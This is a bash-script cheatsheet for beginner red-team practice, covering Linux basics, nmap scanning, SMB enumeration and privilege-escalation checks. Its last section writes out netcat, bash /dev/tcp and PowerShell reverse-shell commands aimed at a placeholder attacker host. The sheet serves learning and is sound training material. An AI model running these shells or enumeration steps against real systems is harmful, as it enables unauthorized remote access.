#!/bin/bash
# 🧠 Ultimate Red Team Cheatsheet – Month 1

echo "== 🐧 Linux Basics =="

# Filesystem & Navigation
pwd                          # Show current directory
cd /etc                      # Change directory
ls -la                       # List all files with permissions
file /etc/passwd             # Determine file type
cat /etc/passwd              # View user accounts

# Users & Permissions
whoami                       # Current user
id                           # UID, GID, groups
chmod 755 file               # rwxr-xr-x
chown user:group file        # Change ownership
adduser hacker               # Add new user

# File Search & Text Tools
find / -name "passwd" 2>/dev/null
grep -i "password" /etc/passwd
awk -F: '{print $1}' /etc/passwd
sed -n '1,5p' /etc/passwd

# Crontab
crontab -l                   # List cron jobs
crontab -e                   # Edit crontab

# Services & Logs
systemctl status ssh
journalctl -xe               # View system logs

echo "== 🌐 Networking & Nmap =="

# Interfaces & IP Info
ip a
ifconfig
ping -c 4 8.8.8.8

# Port Scanning
nmap -sS -T4 target_ip             # TCP SYN scan
nmap -sV -T4 -A target_ip          # Version & OS detection
nmap -p- target_ip                # All ports
nmap --script vuln target_ip      # Vulnerability scripts

# Service Enumeration
smbclient -L //target_ip -N
enum4linux-ng target_ip
ftp target_ip

# DNS / OSINT
nslookup example.com
dig example.com
whois example.com
host -t ns example.com

# Packet Sniffing
tcpdump -i eth0 port 80
# Start Wireshark GUI separately if needed

echo "== 🪟 Windows Basics (for reference) =="

# Windows CMD
# whoami
# tasklist
# netstat -ano
# dir /s /b flag.txt

# PowerShell
# Get-Process
# Get-Service
# Get-EventLog -LogName Security -Newest 20
# Set-ExecutionPolicy Bypass -Scope Process

# Registry (PowerShell)
# reg query HKLM\Software
# reg add HKCU\Software\Test /v Foo /t REG_SZ /d "bar"

echo "== 🔓 Privilege Escalation =="

# Linux Privesc
sudo -l                          # Check sudo rights
find / -perm -4000 2>/dev/null   # SUID binaries
cat /etc/crontab                 # Check cron jobs
ps aux | grep root               # Root-owned processes

# Windows Privesc (commented for reference)
# whoami /groups
# icacls C:\path\to\file
# schtasks /query /fo LIST /v

echo "== 🛠️ Common Tools =="

# Tool Summary
# - nmap: port scanning
# - netcat: shells
# - smbclient: SMB enum
# - tcpdump: packet sniffer
# - Metasploit: exploitation
# - Burp Suite: web proxy
# - PEAS scripts: privilege escalation

echo "== 🧷 Reverse Shells =="

# Netcat Reverse Shell
# Listener
# nc -lvnp 4444
# Target
# nc attacker_ip 4444 -e /bin/bash

# Bash Reverse Shell
# bash -i >& /dev/tcp/attacker_ip/4444 0>&1

# PowerShell Reverse Shell (encoded)
# powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('IP',4444);..."

echo "== ✅ Done. Use this file as a live practice reference. =="
